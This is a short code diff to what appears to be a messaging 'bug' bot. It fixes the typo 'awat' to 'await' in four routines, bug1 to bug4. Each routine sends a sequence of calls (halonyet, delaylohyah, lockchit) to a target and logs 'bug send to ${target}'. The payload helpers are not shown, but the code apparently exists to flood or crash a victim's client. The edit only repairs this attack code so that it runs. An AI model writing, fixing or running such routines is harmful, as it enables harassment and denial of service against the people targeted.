@@ -2176,7 +2176,7 @@ async function bug1(sock, target) {
     try {
       await halonyet(sock, target);
       await halonyet(sock, target);
-      awat delaylohyah(sock, target);
+      await delaylohyah(sock, target);
       await sleep(500);      
       console.log(`bug send to ${target}`);
     } catch (innerError) {
@@ -2193,7 +2193,7 @@ async function bug2(sock, target) {
       await lockchit(sock, target);     
       await halonyet(sock, target);
       await halonyet(sock, target);    
-      awat delaylohyah(sock, target);
+      await delaylohyah(sock, target);
       await sleep(500);               
       console.log(`bug send to ${target}`);
     } catch (innerError) {
@@ -2211,7 +2211,7 @@ async function bug3(sock, target) {
       await sleep(500);
       await halonyet(sock, target);
       await sleep(500);
-      awat delaylohyah(sock, target);
+      await delaylohyah(sock, target);
       await sleep(500);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
@@ -2227,7 +2227,7 @@ async function bug4(sock, target) {
       await sleep(500);
       await halonyet(sock, target);
       await sleep(500);
-      awat delaylohyah(sock, target);
+      await delaylohyah(sock, target);
       await sleep(500);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
